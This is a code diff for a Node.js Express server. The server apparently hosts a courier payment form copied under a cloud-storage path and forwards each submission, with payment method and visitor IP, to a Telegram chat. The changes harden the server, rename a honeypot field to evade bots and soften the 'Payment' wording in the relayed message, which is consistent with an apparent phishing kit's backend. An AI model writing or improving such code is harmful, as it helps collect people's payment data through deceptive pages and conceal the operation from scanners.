@@ -9,7 +9,20 @@ const PORT = process.env.PORT || 3000;
 
 // Security middleware
 app.use(helmet({
-    contentSecurityPolicy: false, // Disable CSP to allow inline scripts in the HTML
+    contentSecurityPolicy: {
+        directives: {
+            defaultSrc: ["'self'"],
+            scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.tailwindcss.com"],
+            styleSrc: ["'self'", "'unsafe-inline'"],
+            imgSrc: ["'self'", "data:", "https:"],
+            connectSrc: ["'self'"],
+            fontSrc: ["'self'"],
+            objectSrc: ["'none'"],
+            mediaSrc: ["'self'"],
+            frameSrc: ["'none'"],
+        },
+    },
+    crossOriginEmbedderPolicy: false,
 }));
 
 // Rate limiting for form submissions
@@ -37,15 +50,19 @@ if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
     console.warn('Telegram credentials not configured. Form submissions will be logged but not sent to Telegram.');
 }
 
-// Serve static files from the root directory
-app.use(express.static(__dirname));
+// Serve static files from the root directory (excluding sensitive files)
+app.use(express.static(__dirname, {
+    dotfiles: 'deny',
+    index: false
+}));
 
 // Helper function to validate submission
 function validateSubmission(req) {
     const errors = [];
     
     // Check honeypot field (should be empty)
-    if (req.body.website && req.body.website.trim() !== '') {
+    // Using a less obvious field name that bots might not recognize
+    if (req.body.company_url && req.body.company_url.trim() !== '') {
         errors.push('Bot detected: honeypot field filled');
     }
     
@@ -99,7 +116,7 @@ app.post('/api/submit', submitLimiter, async (req, res) => {
         
         // Send to Telegram if configured
         if (bot && TELEGRAM_CHAT_ID) {
-            const message = `🚚 *New Courier Payment Form Submission*\n\n` +
+            const message = `🚚 *New Courier Form Submission*\n\n` +
                 `💳 *Payment Method:* ${formData.paymentMethod}\n` +
                 `📅 *Timestamp:* ${formData.timestamp}\n` +
                 `🌐 *IP Address:* ${formData.ipAddress}\n` +
@@ -131,8 +148,17 @@ app.get('/health', (req, res) => {
     res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
+// Rate limiting for main page access
+const pageAccessLimiter = rateLimit({
+    windowMs: 60 * 1000, // 1 minute
+    max: 100, // limit each IP to 100 requests per windowMs
+    message: 'Too many requests from this IP, please try again later.',
+    standardHeaders: true,
+    legacyHeaders: false,
+});
+
 // Serve main page
-app.get('/', (req, res) => {
+app.get('/', pageAccessLimiter, (req, res) => {
     res.sendFile(path.join(__dirname, 'f006.backblazeb2.com', 'file', 'dwiupo', 'index.html'));
 });
 
